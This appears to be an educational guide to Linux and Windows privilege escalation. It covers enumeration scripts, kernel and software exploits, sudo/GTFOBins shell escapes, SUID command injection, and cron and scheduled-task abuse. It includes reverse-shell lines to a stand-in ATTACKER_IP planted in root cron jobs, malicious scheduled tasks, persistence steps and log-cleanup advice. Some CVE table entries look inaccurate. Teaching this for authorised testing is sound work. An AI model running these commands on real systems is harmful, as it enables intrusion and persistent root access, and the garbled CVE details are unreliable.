# Privilege Escalation (PrivEsc) - Comprehensive Learning Guide

---

## QUICK REFERENCE CARD

**Privilege Escalation Definition:**
```
Converting low-privilege user access → High-privilege user access
(user/www-data) → (root/SYSTEM)
```

**Why PrivEsc Matters:**
```
✓ Initial exploit = Low-privilege shell
✓ Most targets run low-privilege processes
✓ Real access needs admin/root privileges
✓ Most valuable data needs elevated access
✓ PrivEsc = Often easiest path to full compromise
```

**Two Types:**
```
1. Linux PrivEsc: user → root
2. Windows PrivEsc: user → administrator/SYSTEM
```

**Strategic Approach:**
```
1. Gain initial access (any user)
2. Thoroughly enumerate the box
3. Find internal vulnerabilities
4. Escalate privileges
5. Achieve full system compromise
```

---

# PART 1: PRIVILEGE ESCALATION FUNDAMENTALS

## The Problem: Limited Access

### Initial Access Reality

```
You exploit a vulnerability → Get shell access
BUT usually as LOW-PRIVILEGE USER:

Linux Examples:
✗ www-data (web server user)
✗ www (web server user)
✗ nobody (unprivileged user)
✗ Limited standard user

Windows Examples:
✗ IIS AppPool user
✗ Limited user account
✗ Service account (limited)
✗ Standard user (not admin)
```

### What You CAN'T do as Low-Privilege User:

```
❌ Read /etc/shadow (Linux)
❌ Access sensitive files
❌ Modify system files
❌ Stop/start services
❌ Install backdoors
❌ Achieve persistence
❌ Read other users' data
❌ Access admin functions
```

### What You NEED:

```
✅ Root (Linux) or Administrator/SYSTEM (Windows)
✅ Full system control
✅ Access to everything
✅ Ability to install persistence
✅ Complete compromise
```

---

## The Solution: Privilege Escalation

**Definition:**
```
Finding and exploiting LOCAL vulnerabilities
to escalate from low-privilege → high-privilege user
```

**Key Concept:**
```
PrivEsc is about INTERNAL vulnerabilities
NOT about exploiting remote services
You're already on the system
You're looking for weaknesses from inside
```

---

## Two Approaches to PrivEsc

### Approach 1: Manual Enumeration

```
Run specific commands
Check specific configurations
Look for specific weaknesses
Time-consuming but stealthy
Avoids triggering security tools
```

**Advantages:**
✓ Minimal noise
✓ Avoids detection
✓ Targeted approach
✓ Understand what you're doing

**Disadvantages:**
✗ Time-consuming
✗ Easy to miss things
✗ Requires knowledge

---

### Approach 2: Automated Scripts

```
Run enumeration script
Script checks everything automatically
Script reports findings
Fast and comprehensive
May create noise
```

**Advantages:**
✓ Fast
✓ Comprehensive
✓ Catches everything
✓ Great for learning

**Disadvantages:**
✗ Creates noise/logs
✗ May trigger AV/IDS
✗ May alert defenders
✗ Not stealthy

---

## PrivEsc Methodology

```
1. GAIN INITIAL ACCESS
   └─ Any user, any method
   └─ Shell access confirmed

2. ENUMERATE THOROUGHLY
   └─ Manual checks or automated scripts
   └─ Look for all weaknesses

3. IDENTIFY VULNERABILITIES
   └─ Find exploitable weaknesses
   └─ Assess feasibility

4. EXPLOIT VULNERABILITY
   └─ Execute exploit
   └─ Elevate privileges

5. VERIFY SUCCESS
   └─ Confirm root/admin access
   └─ id or whoami command

6. ESTABLISH PERSISTENCE
   └─ Create backdoor
   └─ Maintain access
   └─ Install persistence mechanism
```

---

# PART 2: ENUMERATION STRATEGIES

## Resource 1: HackTricks

**What it is:**
```
Comprehensive checklist for privilege escalation
Covers both Linux and Windows
Best maintained, constantly updated
https://book.hacktricks.xyz/
```

**Contains:**
```
✓ Linux Local Privilege Escalation
✓ Windows Local Privilege Escalation
✓ Common exploitation techniques
✓ Configuration vulnerabilities
✓ Service/process weaknesses
✓ File permission issues
✓ Kernel exploits
```

**Best For:**
```
✓ Reference guide
✓ Understanding concepts
✓ Learning approaches
✓ Manual enumeration
```

---

## Resource 2: PayloadsAllTheThings

**What it is:**
```
GitHub repository with exploitation payloads
Comprehensive checklists for both OS
Includes actual exploits and payloads
https://github.com/swisskyrepo/PayloadsAllTheThings
```

**Contains:**
```
✓ Linux PrivEsc checklist
✓ Windows PrivEsc checklist
✓ Actual exploit code
✓ Command examples
✓ One-liners for enumeration
```

**Best For:**
```
✓ Quick command reference
✓ Copy-paste commands
✓ Learning payloads
✓ Multi-OS comparison
```

---

## Resource 3: Automated Enumeration Scripts

### Common Linux Scripts

**LinEnum**
```
Purpose: Automated Linux enumeration
Creates comprehensive report
Shows potential vulnerabilities
```

**linuxprivchecker**
```
Purpose: Check for Linux vulnerabilities
Python-based enumeration
Highlights exploitable weaknesses
```

**PEASS (Privilege Escalation Awesome Scripts SUITE)**
```
Purpose: Well-maintained, up-to-date scripts
Includes both Linux and Windows versions
Actively maintained
Catches latest vulnerabilities
```

**LinPEAS** (PEASS for Linux)
```
Comprehensive Linux enumeration
Excellent colored output
Easy to read report
Most popular for Linux
```

---

### Common Windows Scripts

**Seatbelt**
```
Purpose: Windows enumeration tool
.NET-based
Gathers system information
Identifies potential vulnerabilities
```

**JAWS**
```
Purpose: Automated Windows privilege check
PowerShell-based
Comprehensive enumeration
Easy to run
```

**PEASS for Windows** (winPEAS)
```
Comprehensive Windows enumeration
Excellent output formatting
Finds common weaknesses
Well-maintained
```

---

## Important Security Consideration: AV/IDS Detection

### ⚠️ Critical Warning

```
These scripts create A LOT of noise:

✗ Runs many commands
✗ Generates process events
✗ Creates network activity
✗ Triggers system logging
✗ May be detected by monitoring tools
✗ Can alert defenders
✗ Can trigger antivirus
✗ Can cause system alerts
```

### When Detection Matters

```
STEALTH ENGAGEMENT:
❌ Don't run scripts
❌ May alert defenders
❌ May trigger incident response
❌ May compromise engagement

RED TEAM EXERCISE:
⚠️ Scripts may fail
⚠️ AV may block execution
⚠️ IDS may alert
⚠️ May fail at critical moment

LEARNING/LAB ENVIRONMENT:
✅ Run scripts freely
✅ No detection concerns
✅ Great for learning
✅ See all findings
```

### Solution: Manual Enumeration

```
When scripts won't work:
1. Run specific commands
2. Check specific configurations
3. Look for specific weaknesses
4. Takes more time
5. Creates less noise
6. Still effective
```

---

## Example: Running LinPEAS on Linux

### Command

```bash
./linpeas.sh
```

### What Happens

```
Script starts executing
Runs enumeration checks
Gathers system information
Displays colored output report
Highlights findings
Shows potential vulnerabilities
```

### Example Output Sections

```
====================================( System Info )====================================
Kernel: Linux target 5.10.0-8-amd64 #1 SMP
Hostname: target-box
OS: Linux target 5.10.0-8-amd64

====================================( Users )====================================
uid=1000(user) gid=1000(user) groups=1000(user),4(adm),27(sudo)
uid=0(root)

====================================( SUDO without password )====================================
user ALL=(ALL) NOPASSWD: /usr/bin/find

====================================( Files with Capabilities )====================================
/usr/bin/ping cap_net_raw=ep

====================================( SUID/SGID Files )====================================
-rwsr-xr-x 1 root root /usr/bin/passwd
-rwsr-xr-x 1 root root /usr/bin/sudo

====================================( Interesting Files )====================================
-rw-r--r-- 1 root root /home/user/.ssh/id_rsa
```

---

## Reading Enumeration Output

### Key Sections to Check

```
1. USER & GROUP INFO
   └─ What user are you?
   └─ What groups do you belong to?
   └─ Any interesting group membership?

2. SUDO PRIVILEGES
   └─ Can you run commands as root?
   └─ Without password?
   └─ What commands allowed?

3. SUID/SGID FILES
   └─ Files running as different user
   └─ Potentially exploitable
   └─ Check if vulnerable

4. FILE CAPABILITIES
   └─ Special capabilities on files
   └─ May allow privilege escalation
   └─ Linux-specific

5. WRITABLE FILES/DIRECTORIES
   └─ Can you write to system files?
   └─ Can you modify configurations?
   └─ Potential backdoor paths

6. CRON JOBS
   └─ Scheduled tasks
   └─ Any as root?
   └─ Can you modify them?

7. INSTALLED SOFTWARE
   └─ Outdated applications?
   └─ Known vulnerabilities?
   └─ Exploitable versions?

8. RUNNING PROCESSES
   └─ What's running as root?
   └─ Any with vulnerabilities?
   └─ Any writable by you?
```

---

## Common Vulnerability Categories

### Category 1: Sudo Misconfiguration

```
User can run command as root without password
Example: user ALL=(ALL) NOPASSWD: /usr/bin/find

Exploit: Run command → Get root shell
Command: sudo find / -exec /bin/bash \; -quit
Result: Root shell access
```

---

### Category 2: SUID/SGID Binaries

```
File runs as different user (usually root)
Example: -rwsr-xr-x root /usr/bin/vulnerable-app

Exploit: If vulnerable → Get root shell
Requires: Finding vulnerable binary
Method: Analyze binary for flaws
```

---

### Category 3: File Capabilities

```
Special permissions on executables
Example: /usr/bin/ping has cap_net_raw

Exploit: Might allow privilege escalation
Linux-specific vulnerability
Requires: Understanding capabilities
```

---

### Category 4: Writable Directories

```
Can you write to system directories?
Example: /tmp, /var/tmp, /home directories

Exploit: Write malicious files
Create backdoor scripts
Modify configuration files
```

---

### Category 5: Cron Job Exploitation

```
Scheduled tasks running as root
Example: Script at /usr/local/bin/backup.sh runs hourly as root

Exploit: If you can modify script → Root execution
Method: Replace with malicious code
Result: Root code execution at scheduled time
```

---

### Category 6: Outdated Software

```
Old application version with known CVE
Example: Old kernel with privilege escalation exploit

Exploit: Use public exploit code
Method: Compile and run exploit
Result: Privilege escalation
```

---

### Category 7: Weak Permissions

```
Important files with wrong permissions
Example: /etc/shadow readable by everyone
Example: Configuration files writable by users

Exploit: Read sensitive data
Modify critical files
Create backdoors
```

---

### Category 8: Script/Binary Analysis

```
Analyze custom scripts or binaries
Look for bugs/flaws
Check for hard-coded credentials
Look for insecure practices

Exploit: Reverse engineer
Find vulnerability
Exploit it
```

---

## Manual Enumeration vs Scripts: Decision Tree

```
QUESTION 1: Stealth important?
   YES → Manual enumeration
   NO → Go to Question 2

QUESTION 2: Time available?
   LOTS → Scripts (comprehensive)
   LIMITED → Manual (target key areas)

QUESTION 3: Learning or production?
   LEARNING → Scripts (see everything)
   PRODUCTION → Manual (stealthy)

QUESTION 4: System has AV/IDS?
   YES → Manual (scripts may fail)
   NO → Scripts (safe to run)
```

---

## Key Takeaways - Part 1: PrivEsc Fundamentals

1. **Initial access = Low privilege:**
   - Exploits give you user shell, not root
   - Limited access to system
   - Need escalation for real impact

2. **PrivEsc = Internal vulnerability exploitation:**
   - Already on system
   - Looking for local weaknesses
   - Not remote exploitation

3. **Two enumeration approaches:**
   - Automated scripts (fast, noisy)
   - Manual enumeration (slow, stealthy)

4. **Multiple resources available:**
   - HackTricks (reference/learning)
   - PayloadsAllTheThings (quick reference)
   - PEASS/LinPEAS/winPEAS (comprehensive)

5. **Common vulnerability categories:**
   - Sudo misconfigurations
   - SUID/SGID binaries
   - File capabilities
   - Writable system directories
   - Cron job exploitation
   - Outdated software
   - Weak permissions
   - Script/binary flaws

6. **Detection vs stealth trade-off:**
   - Scripts are noisy
   - Manual is slower but stealthier
   - Context determines approach
   - Choose wisely

---

# PART 2: COMMON PRIVILEGE ESCALATION VECTORS

## Vector 1: Kernel Exploits

### The Concept

```
Unpatched/Old Operating System
    ↓
Contains known security vulnerabilities
    ↓
Kernel vulnerability exists in release
    ↓
Exploit public CVE → Get root access
```

**Key Insight:**
```
Older systems = More vulnerabilities
Unpatched systems = Known vulnerabilities
Kernel exploits = Direct path to root
```

---

### How Kernel Exploits Work

**Strategy:**

1. **Identify OS Version**
   ```bash
   $ uname -r
   3.10.0-1127.el7.x86_64
   # OR
   $ cat /etc/os-release
   Ubuntu 16.04 LTS
   ```

2. **Search for Known Exploits**
   ```bash
   # Method 1: Google the version
   "3.10.0-1127 kernel exploit"
   
   # Method 2: Use SearchSploit
   $ searchsploit 3.10.0 linux
   
   # Method 3: Check CVE databases
   https://cve.mitre.org
   https://nvd.nist.gov
   ```

3. **Find CVE Number**
   ```
   CVE-YEAR-NUMBER format
   Example: CVE-2016-5195 (DirtyCow)
   ```

4. **Download/Build Exploit**
   ```bash
   # Find exploit code
   # Compile if needed (usually C code)
   $ gcc exploit.c -o exploit
   ```

5. **Run on Target**
   ```bash
   $ ./exploit
   # Success: Root shell obtained
   ```

---

### Real Example: DirtyCow (CVE-2016-5195)

**Vulnerability:**
```
Affects: Linux kernels before 4.8.3
Issue: Race condition in memory handling
Impact: Privilege escalation to root
```

**Identification:**
```bash
$ uname -r
3.10.0-514.el7.x86_64
# Kernel version 3.10 → Vulnerable!
```

**Exploitation:**
```bash
$ searchsploit DirtyCow
[*] DirtyCow CVE-2016-5195 Linux Privilege Escalation

$ # Download and compile
$ gcc -pthread dirty.c -o dirty -lutil
$ ./dirty

# Result: Root shell or backdoor user created
```

---

### Linux Kernel Exploits: Common CVEs

| CVE | Name | Affected | Impact |
|-----|------|----------|--------|
| **CVE-2016-5195** | DirtyCow | Linux < 4.8.3 | Privilege Escalation |
| **CVE-2021-4034** | PwnKit | Linux (systemd) | Privilege Escalation |
| **CVE-2021-22555** | Netfilter | Linux 4.x | Privilege Escalation |
| **CVE-2019-1010317** | ptrace | Linux < 5.3 | Privilege Escalation |
| **CVE-2017-1000112** | UFO | Linux < 4.13 | Privilege Escalation |

---

### Windows Kernel Exploits: Common CVEs

| CVE | Name | Affected | Impact |
|-----|------|----------|--------|
| **CVE-2014-6324** | Kerberos DoublePulsar | Windows Server 2012 R2 | Privilege Escalation |
| **CVE-2016-3225** | Win32k | Windows 7/8/10 | Privilege Escalation |
| **CVE-2017-0005** | GDI | Windows 7/8/10 | Privilege Escalation |
| **CVE-2018-8611** | Win32k | Windows 10 | Privilege Escalation |

---

### ⚠️ Critical Warnings: Kernel Exploits

**Danger 1: System Instability**

```
Kernel exploits interact with core system components
Buggy exploit → System crash
Success might still cause instability
Production systems at risk
```

**Best Practice:**
```
✓ Test in lab environment first
✓ Understand what exploit does
✓ Have rollback plan
✓ Never on production without approval
```

---

**Danger 2: Data Loss**

```
Kernel exploit crashes system
Unsaved data lost
Running processes terminated
File system might be corrupted
```

**Mitigation:**
```
✓ Coordinate with client
✓ Schedule during maintenance window
✓ Have backups ready
✓ Document your actions
```

---

**Danger 3: Detection**

```
Kernel exploits create system events
Crash = obvious sign of compromise
Suspicious processes = detected
Stability issues = admin investigation
```

**Solution:**
```
✓ Use stealthier exploits first
✓ Use kernel exploit as last resort
✓ Clean up logs if possible
✓ Document reason for instability
```

---

### Kernel Exploit Methodology

**Step 1: Identify Version**
```bash
$ uname -a
Linux target 3.10.0-514.el7.x86_64
```

**Step 2: Search for Vulnerabilities**
```bash
$ searchsploit 3.10.0
# Or
$ google "3.10.0 linux kernel exploit"
```

**Step 3: Assess Applicability**
```
- Is this the right kernel version?
- Does exploit apply to your CPU architecture (x86/x64)?
- Are dependencies available (gcc, etc.)?
```

**Step 4: Obtain Exploit**
```bash
# From SearchSploit
$ searchsploit -m linux/local/40844.c

# Or from GitHub/Exploit-DB
$ wget https://raw.githubusercontent.com/.../exploit.c
```

**Step 5: Compile (if needed)**
```bash
$ gcc -o exploit exploit.c -pthread
# Or
$ python3 exploit.py
# Or
$ ./exploit.sh (already compiled)
```

**Step 6: Execute with Caution**
```bash
$ ./exploit
# Monitor for crashes/errors
# Check if root access achieved
```

**Step 7: Verify Success**
```bash
$ id
uid=0(root) gid=0(root) groups=0(root)
# SUCCESS!
```

---

## Vector 2: Vulnerable Software

### The Concept

```
Installed outdated application
    ↓
Contains known security vulnerability
    ↓
Public exploit available
    ↓
Exploit vulnerability → Get root access
```

**Key Insight:**
```
Old software = Known vulnerabilities
Public exploits available
Often easier than kernel exploits
```

---

### How to Find Installed Software

**On Linux:**

```bash
# List all installed packages
$ dpkg -l
# Shows: package name, version, description

# Example:
ii  openssh-server    1:7.4p1-10
ii  apache2           2.4.41-1
ii  mysql-server      8.0.23-0
```

**Better formatting:**
```bash
$ dpkg -l | grep -i mysql
ii  mysql-server      8.0.23-0
```

**Find specific version:**
```bash
$ dpkg -l | grep apache
ii  apache2           2.4.41-1
```

---

**On Windows:**

```cmd
# Check Program Files
C:\> dir "C:\Program Files"
C:\> dir "C:\Program Files (x86)"

# Or use PowerShell
PS> Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*
```

**See all installed software with versions:**
```cmd
C:\> wmic product list brief
```

---

### Example: Vulnerable Apache Version

**Discovered:**
```bash
$ dpkg -l | grep apache
ii  apache2  2.4.10-1

$ apache2 -v
Server version: Apache/2.4.10 (Debian)
```

**Search for Exploits:**
```bash
$ searchsploit apache 2.4.10
# Results:
# - CVE-2021-41773 (Apache 2.4.50)
# - CVE-2021-42013 (Apache 2.4.50)
# ... many others

# Or Google:
# "apache 2.4.10 exploit"
# "Apache 2.4.10 CVE"
```

**Check for Path Traversal:**
```bash
# Apache 2.4.49+ has path traversal
# But 2.4.10 might have different vulns
# Search for specific CVEs affecting 2.4.10
```

---

### Example: Vulnerable MySQL Version

**Discovered:**
```bash
$ mysql --version
mysql  Ver 14.14 Distrib 5.7.20

$ # This is old! Current is 8.0+
```

**Search for Exploits:**
```bash
$ searchsploit mysql 5.7.20
# Results: Multiple privilege escalation vectors

$ searchsploit "mysql 5.7" privilege escalation
```

**Common MySQL PrivEsc Vectors:**

1. **UDF Exploitation**
   ```
   MySQL running as root
   Can load custom libraries (UDF)
   Create backdoor library
   Execute commands as root
   ```

2. **Plugin Exploitation**
   ```
   Vulnerable MySQL plugins
   Execute code through plugins
   Gain root execution
   ```

---

### How to Identify Vulnerable Software Versions

**Method 1: Online Vulnerability Database**

```
1. Know the software: Apache, MySQL, PHP, etc.
2. Know the version: 2.4.10, 5.7.20, 7.4.3, etc.
3. Search CVE database:
   https://cve.mitre.org/cgi-bin/cvename.cgi?name=
   
4. Check if vulnerabilities are available
5. Check if public exploits exist
```

**Method 2: SearchSploit**

```bash
# Exact software + version
$ searchsploit apache 2.4.10

# Or multiple versions
$ searchsploit "apache 2.4"

# Look for:
# - Local privilege escalation
# - Remote code execution
# - Configuration issues
```

**Method 3: GitHub Exploit Repositories**

```
Search GitHub for:
"apache 2.4.10 exploit"
"apache 2.4.10 rce"

Many security researchers publish exploits on GitHub
```

---

### Software Vulnerability Exploitation Workflow

**Step 1: List Installed Software**

Linux:
```bash
$ dpkg -l
# Note all software and versions
```

Windows:
```cmd
C:\> Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*
```

**Step 2: Note Interesting Software**

```
Look for:
✓ Old versions (3+ years old)
✓ Server software (Apache, MySQL, etc.)
✓ Popular targets (PHP, Java, etc.)
✓ Rarely updated (embedded systems, appliances)
```

**Step 3: Search for Vulnerabilities**

```bash
$ for app in apache2 mysql php; do
    searchsploit "$app" | head -5
  done
```

**Step 4: Assess Exploitability**

```
Questions to ask:
- Does exploit apply to my version?
- Is the vulnerability local or remote?
- Do I have required permissions?
- Are dependencies available?
- How stable is the exploit?
```

**Step 5: Obtain and Verify Exploit**

```bash
# Download
$ searchsploit -m path/to/exploit.c

# Read the code
$ cat exploit.c
# Look for version check, dependencies, etc.

# Compile if needed
$ gcc -o exploit exploit.c
```

**Step 6: Execute and Verify**

```bash
$ ./exploit
# Monitor output
# Check for success indicators

$ id
# Should show elevated privileges
```

---

## Common Vulnerable Software in Linux

| Software | Vulnerable Versions | Common Exploit | Impact |
|----------|-------------------|---------------|---------:|
| **Apache** | 2.4.49-2.4.50 | Path Traversal | RCE/PrivEsc |
| **MySQL/MariaDB** | 5.x, < 8.0.12 | UDF Loading | PrivEsc |
| **PHP** | < 7.0.0 | Various | RCE/PrivEsc |
| **sudo** | < 1.9.5 | Heap Overflow | PrivEsc |
| **OpenSSH** | < 7.4 | Username Enumeration | Info Disclosure |
| **Vim** | < 7.4.1157 | Modeline | RCE |

---

## Common Vulnerable Software in Windows

| Software | Vulnerable Versions | Common Exploit | Impact |
|----------|-------------------|---------------|---------:|
| **IIS** | < 10.0 | Various | RCE/PrivEsc |
| **SQL Server** | 2012, 2014 | UNC Path Injection | RCE |
| **PowerShell** | < 5.0 | Execution Policy Bypass | RCE |
| **WinRM** | Unpatched | Various | RCE |
| **SMBv3** | Unpatched | Various | RCE |

---

## Priority: What to Look for First

### High Priority (High Likelihood of Exploitation)

```
1. Kernel exploits (if old kernel)
2. Apache/web server vulnerabilities
3. Database software (MySQL, MSSQL)
4. Sudo/privilege management issues
5. Outdated scripting languages
```

### Medium Priority

```
6. Services running as root
7. Installed development tools
8. Custom applications
9. Monitoring/logging software
10. Backup utilities
```

### Low Priority (Harder to Exploit)

```
11. Client applications
12. System utilities
13. Recently patched software
14. Niche software
```

---

## Key Takeaways - Part 2: Common Vectors

1. **Kernel exploits:**
   - Identify OS version
   - Search for known CVEs
   - Test in lab first
   - Use as last resort (unstable)

2. **Vulnerable software:**
   - Identify all installed packages
   - Check version numbers
   - Search for public exploits
   - Often easier than kernel exploits

3. **Finding software:**
   - Linux: `dpkg -l`
   - Windows: `C:\Program Files`, PowerShell, WMIC
   - Note versions carefully

4. **Exploitation workflow:**
   - Identify software
   - Find vulnerability
   - Obtain exploit
   - Test in lab
   - Execute carefully
   - Verify success

5. **Priority approach:**
   - Kernel first (if applicable)
   - Then software exploits
   - Then other vectors
   - Use least disruptive first

6. **Safety considerations:**
   - Lab test first
   - Get explicit approval
   - Have rollback plan
   - Monitor for crashes
   - Document everything

---

# PART 3: USER PRIVILEGES & CREDENTIAL EXPLOITATION

## Vector 1: Sudo Privileges

### What is Sudo?

**Definition:**
```
sudo = "superuser do"
Allows users to execute commands as different user
Typically used to let unprivileged users run root commands
Controlled via /etc/sudoers file
```

**Why It Matters:**
```
✓ Common misconfiguration
✓ Can escalate to root directly
✓ May not require password
✓ One of easiest PrivEsc vectors
```

---

### Checking Sudo Privileges

**Command:**
```bash
sudo -l
```

**Example Output (Password Required):**
```bash
$ sudo -l
[sudo] password for user:
# (You need password - not useful for RCE access)
```

**Example Output (No Password Required):**
```bash
$ sudo -l
Matching Defaults entries for user on target:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User user may run the following commands without password:
    (root) NOPASSWD: /bin/echo
    (root) NOPASSWD: /usr/bin/find
    (www-data) NOPASSWD: /bin/cat

# This is VULNERABLE!
```

---

### Understanding Sudo Output

**Format Breakdown:**

```
(user : user) NOPASSWD: /bin/echo
 ↑     ↑      ↑        ↑
 |     |      |        |
 |     |      |        └─ Command that can be run
 |     |      └─ NOPASSWD = don't need password
 |     └─ Pseudo-user (who you run as)
 └─ Real user (who you are)
```

**Examples:**

```bash
# Run /bin/echo as root, no password
(root) NOPASSWD: /bin/echo
→ Can execute: sudo /bin/echo

# Run /usr/bin/find as www-data, no password
(www-data) NOPASSWD: /usr/bin/find
→ Can execute: sudo -u www-data /usr/bin/find

# Run ALL commands as root with password
(root) ALL
→ Can execute anything, but needs password

# Run specific command as specific user
(www-data) NOPASSWD: /usr/bin/id
→ Can execute: sudo -u www-data /usr/bin/id
```

---

### Exploiting Sudo Privileges

**If You Have NOPASSWD Sudo:**

```
1. Check what commands you can run
   $ sudo -l

2. Look for exploitable commands
   - Can any command give you shell?
   - Can any command read/write files?
   - Can any command execute other commands?

3. Use that command to escalate
   $ sudo /bin/command arg1 arg2
```

---

### GTFOBins: Finding Sudo Exploits

**What is GTFOBins?**
```
GitHub repository: https://gtfobins.github.io
List of Unix/Linux commands that can be exploited
Shows HOW to exploit each command
Includes shell escaping techniques
```

**How to Use:**

```
1. Find command you have sudo for
   Example: /bin/find

2. Visit GTFOBins and search "find"

3. Look for "Sudo" section
   Shows exact exploit command

4. Copy the exploit command
```

---

### Common Sudo Exploitation Examples

**Example 1: Sudo with find**

```bash
$ sudo -l
(root) NOPASSWD: /usr/bin/find

# GTFOBins says:
$ sudo find / -exec /bin/sh \; -quit
root@target:~# id
uid=0(root) gid=0(root) groups=0(root)
# SUCCESS!
```

**Explanation:**
```
sudo find /        # Run find with sudo (as root)
  -exec /bin/sh   # Execute shell when find matches
  \; -quit        # After first match, quit
# Result: Root shell!
```

---

**Example 2: Sudo with less**

```bash
$ sudo -l
(root) NOPASSWD: /usr/bin/less

# GTFOBins says:
$ sudo less /etc/passwd
# Then inside less, type: !/bin/sh
root@target:~# id
uid=0(root) gid=0(root) groups=0(root)
# SUCCESS!
```

**Explanation:**
```
less /etc/passwd   # Open file in less pager
!/bin/sh           # Inside less, ! escapes to shell
# Result: Root shell!
```

---

**Example 3: Sudo with vi/vim**

```bash
$ sudo -l
(root) NOPASSWD: /usr/bin/vim

# GTFOBins says:
$ sudo vim
# Inside vim, type: :!/bin/sh
root@target:~# id
uid=0(root) gid=0(root) groups=0(root)
# SUCCESS!
```

---

### Using GTFOBins Effectively

**Step-by-Step:**

```
1. Get your sudo privileges
   $ sudo -l
   Note: /usr/bin/find

2. Go to https://gtfobins.github.io

3. Search for "find"

4. Find "Sudo" section (if exists)

5. Copy the exact command

6. Execute it

7. You should get root shell
```

**What if Command Not on GTFOBins?**

```
Try these approaches:
1. Search manually for the command + "PrivEsc"
2. Read the command's man page for escape options
3. Combine with other vectors (file write, etc.)
4. Ask: "Can this read files? Write files? Execute?"
```

---

### LOLBAS (Windows Equivalent)

**What is LOLBAS?**
```
Windows version of GTFOBins
Repository: https://lolbas-project.github.io
Lists Windows built-in tools that can be abused
Includes privilege escalation techniques
```

**Common Windows Tools:**
```
- rundll32.exe (execute DLLs)
- powershell.exe (script execution)
- reg.exe (registry modification)
- wmic.exe (Windows Management Instrumentation)
- msiexec.exe (Windows installer)
```

**Example: PowerShell PrivEsc**
```powershell
# Check what you can run
whoami /priv

# Or check UAC bypass techniques
# Use LOLBAS to find exact exploit
```

---

## Vector 2: SUID/SGID Binaries

### What are SUID/SGID Files?

**SUID (Set User ID):**
```
File permission that runs binary as OWNER, not executor
Example: -rwsr-xr-x (note the 's')
Runs as the file owner regardless of who runs it
Typically owner is root
```

**SGID (Set Group ID):**
```
Similar to SUID but for groups
Runs as the group owner instead of user
Less common than SUID
```

---

### Finding SUID/SGID Files

**Command:**
```bash
# Find SUID files
find / -perm -4000 2>/dev/null

# Find SGID files
find / -perm -2000 2>/dev/null

# Find both
find / -perm /4000 -o -perm /2000 2>/dev/null
```

**Example Output:**
```
-rwsr-xr-x 1 root root /usr/bin/passwd
-rwsr-xr-x 1 root root /usr/bin/sudo
-rwsr-xr-x 1 root root /usr/bin/ping
-rwsr-xr-x 1 root root /bin/su
```

---

### Exploiting SUID Binaries

**Concept:**
```
If SUID binary is VULNERABLE
You can exploit it to get root shell
Because it runs as root
```

**Common Vulnerable SUID Binaries:**

```
✓ Custom applications (not standard Linux)
✓ Old versions with known CVEs
✓ Misconfigured binaries
✗ Standard binaries (passwd, sudo, ping - patched)
```

---

### SUID Exploitation Workflow

**Step 1: Find SUID Binaries**
```bash
find / -perm -4000 2>/dev/null
```

**Step 2: Identify Non-Standard Binaries**
```
Standard binaries:
- /usr/bin/passwd
- /usr/bin/sudo
- /bin/su
- /usr/bin/ping

Look for CUSTOM binaries:
- /usr/local/bin/custom_app
- /home/user/app
- Custom programs
```

**Step 3: Test for Vulnerability**
```bash
# Check what it does
strings /usr/local/bin/custom_app

# Try to run it with special arguments
/usr/local/bin/custom_app /etc/shadow

# Try command injection
/usr/local/bin/custom_app "; /bin/sh"
```

**Step 4: Exploit**
```bash
# If vulnerable to command injection:
/usr/local/bin/custom_app "; /bin/sh"
# Runs as root → root shell!
```

---

## Vector 3: Scheduled Tasks & Cron Jobs

### Linux: Cron Jobs

**What are Cron Jobs?**
```
Scheduled tasks that run at specific times
Run commands periodically (hourly, daily, weekly, etc.)
Often run as root for system maintenance
```

**Common Cron Locations:**
```
/etc/crontab              - System-wide cron jobs
/etc/cron.d/              - Additional system cron jobs
/var/spool/cron/crontabs/ - User cron jobs
~/.crontab               - User's personal cron
```

---

### Exploiting Cron Jobs: Two Methods

**Method 1: Write Malicious Cron Job**

```
If you can write to cron directories:
1. Create bash script with reverse shell
2. Add cron job that runs your script
3. Wait for cron to execute
4. Reverse shell connects back
```

**Process:**

```bash
# Step 1: Check if you can write to cron directory
ls -la /etc/cron.d/
# If writable, continue

# Step 2: Create reverse shell script
echo "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1" > /tmp/shell.sh

# Step 3: Add cron job (if writable)
echo "* * * * * root /tmp/shell.sh" >> /etc/cron.d/my_cron

# Step 4: Wait for cron to run (usually within 1 minute)
# Step 5: Receive reverse shell as root
```

---

**Method 2: Modify Existing Cron Job**

```
If a root cron job exists that runs a script:
1. Check if you can modify the script
2. Add malicious code to existing script
3. When cron runs, your code executes as root
```

**Process:**

```bash
# Step 1: Find existing cron jobs
cat /etc/crontab

# Example output:
# 0 * * * * root /usr/local/bin/backup.sh

# Step 2: Check if you can write to the script
ls -la /usr/local/bin/backup.sh
# If writable, continue

# Step 3: Add reverse shell to script
echo "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1" >> /usr/local/bin/backup.sh

# Step 4: Wait for scheduled time
# Step 5: Receive reverse shell as root
```

---

### Windows: Scheduled Tasks

**What are Scheduled Tasks?**
```
Windows equivalent of cron jobs
Run programs at specific times
Often run as SYSTEM (highest privilege)
Managed through Task Scheduler
```

**Checking Scheduled Tasks:**
```powershell
# View all scheduled tasks
Get-ScheduledTask

# View task details
Get-ScheduledTask -TaskName "BackupTask"

# View task history
Get-ScheduledTask -TaskName "BackupTask" | Get-ScheduledTaskInfo
```

---

### Exploiting Windows Scheduled Tasks

**If You Can Create New Task:**

```powershell
# Create new scheduled task
$Action = New-ScheduledTaskAction -Execute "C:\reverse_shell.exe"
$Trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -Action $Action -Trigger $Trigger -TaskName "Updates"

# Task runs when someone logs in → Reverse shell
```

**If You Can Modify Existing Task:**

```powershell
# Modify existing task to run your payload
Set-ScheduledTask -TaskName "Backup" `
  -Action (New-ScheduledTaskAction -Execute "C:\evil.exe")

# Next time task runs → Your code executes
```

---

## Vector 4: Exposed Credentials

### Finding Credentials in Files

**Where Credentials Hide:**

```
Configuration Files:
- /etc/mysql/mysql.conf.d/mysqld.cnf
- /var/www/html/config.php
- /app/settings.ini
- ~/.ssh/config

Log Files:
- /var/log/apache2/access.log
- /var/log/auth.log
- /tmp/*.log

History Files:
- ~/.bash_history (Linux)
- $PROFILE (PowerShell history - Windows)
- ~/.zsh_history
```

---

